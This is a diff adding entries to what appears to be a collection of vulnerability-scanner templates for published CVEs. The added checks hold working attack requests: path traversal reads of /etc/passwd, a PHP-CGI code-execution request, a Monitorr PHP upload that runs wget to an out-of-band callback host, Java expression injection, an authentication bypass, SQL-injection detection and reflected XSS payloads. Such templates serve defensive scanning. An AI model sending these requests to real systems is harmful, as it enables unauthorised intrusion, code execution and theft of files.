@@ -286,6 +286,40 @@
       ]
     },
     {
+      "id": "CVE-2010-2307",
+      "info": {
+        "author": "daffainfo",
+        "description": "Multiple directory traversal vulnerabilities in the web server for Motorola SURFBoard cable modem SBV6120E running firmware SBV6X2X-1.0.0.5-SCM-02-SHPC allow remote attackers to read arbitrary files via (1) \"//\" (multiple leading slash), (2) ../ (dot dot) sequences, and encoded dot dot sequences in a URL request.",
+        "name": "Motorola SBV6120E SURFboard Digital Voice Modem SBV6X2X-1.0.0.5-SCM - Directory Traversal",
+        "reference": "- https://www.securityfocus.com/bid/40550/info\n- https://nvd.nist.gov/vuln/detail/CVE-2010-2307\n",
+        "severity": "high",
+        "tags": "cve,cve2010,iot,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-2861",
       "info": {
         "author": "pikpikcu",
@@ -318,6 +352,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-4231",
+      "info": {
+        "author": "daffainfo",
+        "description": "The CMNC-200 IP Camera has a built-in web server that is enabled by default. The server is vulnerable to directory transversal attacks, allowing access to any file on the camera file system.",
+        "name": "Camtron CMNC-200 IP Camera - Directory Traversal",
+        "reference": "- https://nvd.nist.gov/vuln/detail/CVE-2010-4231\n- https://www.exploit-db.com/exploits/15505\n",
+        "severity": "high",
+        "tags": "cve,cve2010,iot,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/../../../../../../../../../../../../../etc/passwd"
           ]
         }
       ]
@@ -799,6 +867,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/yousaytoo-auto-publishing-plugin/yousaytoo.php?submit=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2012-1823",
+      "info": {
+        "author": "pikpikcu",
+        "description": "sapi/cgi/cgi_main.c in PHP before 5.3.12 and 5.4.x before 5.4.2, when configured as a CGI script (aka php-cgi), does not properly handle query strings that lack an = (equals sign) character, which allows remote attackers to execute arbitrary code by placing command-line options in the query string, related to lack of skipping a certain php_getopt for the 'd' case.\n",
+        "name": "PHP CGI v5.3.12/5.4.2 RCE",
+        "reference": "- https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823\n- https://nvd.nist.gov/vuln/detail/CVE-2012-1823\n",
+        "severity": "critical",
+        "tags": "rce,php,cve,cve2012"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 31\n\n<?php echo shell_exec(\"cat /etc/passwd\"); ?>\n"
           ]
         }
       ]
@@ -2263,6 +2365,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/robotcpa/f.php?l=ZmlsZTovLy9ldGMvcGFzc3dk"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000127",
+      "info": {
+        "author": "daffainfo",
+        "description": "Reflected XSS in wordpress plugin ajax-random-post v2.00",
+        "name": "AJAX Random Post <= 2.00 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000127",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/ajax-random-post/js.php?interval=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -6268,32 +6412,44 @@
     {
       "id": "CVE-2018-3760",
       "info": {
-        "author": "0xrudra",
-        "name": "Rails CVE-2018-3760",
+        "author": "0xrudra,pikpikcu",
+        "description": "Ruby On Rails is a well-known Ruby Web development framework, which uses Sprockets as a static file server in development environment. Sprockets is a Ruby library that compiles and distributes static resource files.\nThere is a path traversal vulnerability caused by secondary decoding in Sprockets 3.7.1 and lower versions. An attacker can use %252e%252e/ to access the root directory and read or execute any file on the target server.\n",
+        "name": "Ruby On Rails Path Traversal",
+        "reference": "- https://github.com/vulhub/vulhub/tree/master/rails/CVE-2018-3760\n- https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf\n- https://seclists.org/oss-sec/2018/q2/210\n- https://xz.aliyun.com/t/2542\n",
         "severity": "high",
         "tags": "cve,cve2018,rails,lfi"
       },
       "requests": [
         {
+          "extractors": [
+            {
+              "internal": true,
+              "name": "path",
+              "part": "body",
+              "regex": [
+                "/etc/passwd is no longer under a load path: (.*?),"
+              ],
+              "type": "regex"
+            }
+          ],
           "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
             {
               "status": [
                 200
               ],
               "type": "status"
-            },
-            {
-              "part": "body",
-              "regex": [
-                "root:[x*]:0:0:"
-              ],
-              "type": "regex"
             }
           ],
           "matchers-condition": "and",
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/assets/file:%2f%2f/etc/passwd"
+          "raw": [
+            "GET /assets/file:%2f%2f/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\nContent-Length: 94\n",
+            "GET /assets/file:%2f%2f{{path}}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\n"
           ]
         }
       ]
@@ -7783,7 +7939,7 @@
     {
       "id": "CVE-2019-15713",
       "info": {
-        "author": "daffainfo",
+        "author": "daffainfo,dhiyaneshDk",
         "description": "Triggered via unescaped usage of URL parameters in multiple locations presented in the public view of a site.",
         "name": "My Calendar <= 3.1.9 - Reflected Cross-Site Scripting (XSS)",
         "reference": "- https://wpscan.com/vulnerability/9267\n- https://nvd.nist.gov/vuln/detail/CVE-2019-15713\n",
@@ -12984,6 +13140,34 @@
       ]
     },
     {
+      "id": "CVE-2020-28871",
+      "info": {
+        "author": "gy741",
+        "description": "This template detects an Monitorr 1.7.6m a remote code execution vulnerability. Improper input validation and lack of authorization leading to arbitrary file upload in web application. An unauthorized attacker with web access to could upload and execute a specially crafted file leading to remote code execution within the Monitorr.",
+        "name": "Monitorr 1.7.6m - Unauthenticated Remote Code Execution",
+        "reference": "- https://nvd.nist.gov/vuln/detail/CVE-2020-28871\n- https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/\n- https://www.exploit-db.com/exploits/48980\n",
+        "severity": "critical",
+        "tags": "cve,cve2020,monitorr,rce,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /assets/php/upload.php HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: text/plain, */*; q=0.01\nConnection: close\nAccept-Language: en-US,en;q=0.5\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data; boundary=---------------------------31046105003900160576454225745\nOrigin: http://{{Hostname}}\nReferer: http://{{Hostname}}\n\n-----------------------------31046105003900160576454225745\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"{{randstr}}.php\"\nContent-Type: image/gif\n\nGIF89a213213123<?php shell_exec(\"wget -c http://{{interactsh-url}}\");\n\n-----------------------------31046105003900160576454225745--\n",
+            "GET /assets/data/usrimg/{{tolower(\"{{randstr}}.php\")}} HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-29164",
       "info": {
         "author": "geeknik",
@@ -14618,6 +14802,59 @@
       ]
     },
     {
+      "id": "CVE-2020-8771",
+      "info": {
+        "author": "princechaddha",
+        "name": "WordPress WP Time Capsule Authentication Bypass",
+        "reference": "https://github.com/SECFORCE/WPTimeCapsulePOC",
+        "severity": "critical",
+        "tags": "cve,cve2020,wordpress,wp-plugin"
+      },
+      "requests": [
+        {
+          "cookie-reuse": true,
+          "extractors": [
+            {
+              "part": "header",
+              "regex": [
+                "wordpress_[a-z0-9]+=([A-Za-z0-9%]+)"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<div id=\"adminmenumain\" role=\"navigation\" aria-label=\"Main menu\">",
+                "<h1>Dashboard</h1>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept: */*\n\nIWP_JSON_PREFIX\n",
+            "GET /wp-admin/index.php HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept: */*\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-8982",
       "info": {
         "author": "dwisiswant0",
@@ -15376,6 +15613,38 @@
       ]
     },
     {
+      "id": "CVE-2021-21479",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "In SCIMono before 0.0.19, it is possible for an attacker to inject and\nexecute java expression compromising the availability and integrity of the system.\n",
+        "name": "SCIMono < v0.0.19 Remote Code Execution",
+        "reference": "https://securitylab.github.com/advisories/GHSL-2020-227-scimono-ssti/",
+        "severity": "critical",
+        "tags": "cve,cve2021,scimono,rce"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "The attribute value",
+                "java.lang.UNIXProcess@",
+                "has invalid value!",
+                "\"status\" : \"400\""
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Schemas/$%7B''.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(\"id\")')%7D"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-21801",
       "info": {
         "author": "gy741",
@@ -15805,6 +16074,41 @@
       ]
     },
     {
+      "id": "CVE-2021-23241",
+      "info": {
+        "author": "daffainfo",
+        "description": "MERCUSYS Mercury X18G 1.0.5 devices allow Directory Traversal via ../ in conjunction with a loginLess or login.htm URI (for authentication bypass) to the web server, as demonstrated by the /loginLess/../../etc/passwd URI.",
+        "name": "Mercury Router Web Server Directory Traversal",
+        "reference": "- https://github.com/BATTZION/MY_REQUEST/blob/master/Mercury%20Router%20Web%20Server%20Directory%20Traversal.md\n- https://nvd.nist.gov/vuln/detail/CVE-2021-23241\n",
+        "severity": "medium",
+        "tags": "cve,cve2021,iot,lfi,router"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:[0*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/loginLess/../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24146",
       "info": {
         "author": "random_robbie",
@@ -16148,6 +16452,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/car1/estimateresult/result?s=&serviceestimatekey=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24340",
+      "info": {
+        "author": "lotusdll",
+        "description": "The WP Statistic WordPress plugin was affected by an Unauthenticated Time-Based Blind SQL Injection security vulnerability.",
+        "name": "WordPress Plugin WP Statistics 13.0-.7 - Unauthenticated Time-Based Blind SQL Injection",
+        "reference": "- https://www.exploit-db.com/exploits/49894\n- https://www.wordfence.com/blog/2021/05/over-600000-sites-impacted-by-wp-statistics-patch/\n- https://github.com/Udyz/WP-Statistics-BlindSQL\n",
+        "severity": "critical",
+        "tags": "cve,cve2021,wordpress,wp-plugin,unauth,sqli,blind"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "WP Statistics"
+              ]
+            },
+            {
+              "part": "body",
+              "regex": [
+                "Stable tag\\: [1][3]\\.[0].([1]|[2]|[3]|[4]|[5]|[6]|[7])|[1][3]\\.[0]$"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/wp-statistics/readme.txt"
           ]
         }
       ]
@@ -16506,6 +16852,41 @@
           "matchers-condition": "and",
           "raw": [
             "POST /webtools/control/SOAPService HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36\nConnection: close\nContent-Type: application/xml\nContent-Length: 910\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n<soapenv:Header/>\n<soapenv:Body>\n<ser>\n<map-HashMap>\n<map-Entry>\n<map-Key>\n<cus-obj>bcc62005737220116a6176612e7574696c2e486173684d617005070c341c16606403200246200a6c6f6164466163746f724920097468726573686f6c6478703f4020202020200c770820202010202020017372200c6a6176612e6e65742e55524cfb2537361a7fa37203200749200868617368436f6465492004706f72744c2009617574686f726974797420124c6a6176612f6c616e672f537472696e673b4c200466696c6571207e20034c2004686f737471207e20034c200870726f746f636f6c71207e20034c200372656671207e20037870a0a0a0a0a0a0a0a07420107435336c71392e646e736c6f672e636e7420012f71207e2005742004687474707078742018687474703a2f2f7435336c71392e646e736c6f672e636e2f780a</cus-obj>\n</map-Key>\n<map-Value>\n<std-String value=\"http://t53lq9.dnslog.cn/\"></std-String>\n</map-Value>\n</map-Entry>\n</map-HashMap>\n</ser>\n</soapenv:Body>\n</soapenv:Envelope>\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-26475",
+      "info": {
+        "author": "geeknik",
+        "description": "EPrints 3.4.2 exposes a reflected XSS opportunity in the via a cgi/cal URI.",
+        "name": "EPrints 3.4.2 XSS",
+        "reference": "https://github.com/grymer/CVE/blob/master/eprints_security_review.pdf",
+        "severity": "medium",
+        "tags": "cve,cve2021,xss,eprints"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "</title><script>alert('{{randstr}}')</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi/cal?year=2021%3C/title%3E%3Cscript%3Ealert(%27{{randstr}}%27)%3C/script%3E"
           ]
         }
       ]
